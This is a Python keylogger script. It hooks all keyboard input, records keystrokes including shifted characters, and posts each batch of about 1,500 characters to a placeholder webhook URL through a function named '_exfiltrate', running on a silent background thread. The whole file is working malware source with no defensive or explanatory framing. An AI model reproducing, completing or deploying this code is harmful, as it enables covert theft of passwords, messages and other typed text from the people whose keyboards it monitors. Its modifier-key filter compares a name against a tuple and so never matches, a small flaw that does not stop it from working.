import keyboard, threading, os, sys, requests, json

_shift = False
char = ''

def _exfiltrate(_info):
    _url = 'YOUR WEBHOOK HERE'
    try:
        payload = {
            'content': _info
        }

        headers = {
            'Content-Type': 'application/json'
        }
        
        response = requests.post(_url, data=json.dumps(payload), headers=headers)
    except:
        pass

def on_key_event(event):
    global _shift, char
    
    if not event.name == ('alt', 'ctrl', 'left', 'right', 'home'):
        if event.name == 'space': # convert to space character
            char = char + ' '
        elif event.name == 'backspace': # subtract character
            try:
                char = char[:-1]
            except:
                pass
        elif event.name == 'enter': # subtract character
            try:
                char = char + '\n'
            except:
                pass
        elif event.name == 'shift': #handle shift
            _shift = True
        elif _shift == True: # convert to upper case
            new = event.name.upper()
            char = char + new
            _shift = False
        else:
            char = char + event.name
    
    if len(char) >= 1500:
        x = threading.Thread(target=_exfiltrate, args=(char,))
        x.daemon = True
        x.start()
        char = ''
        #keyboard.unhook_all()

keyboard.on_press(on_key_event)
try:
    keyboard.wait()
except KeyboardInterrupt:
    pass

sys.exit()
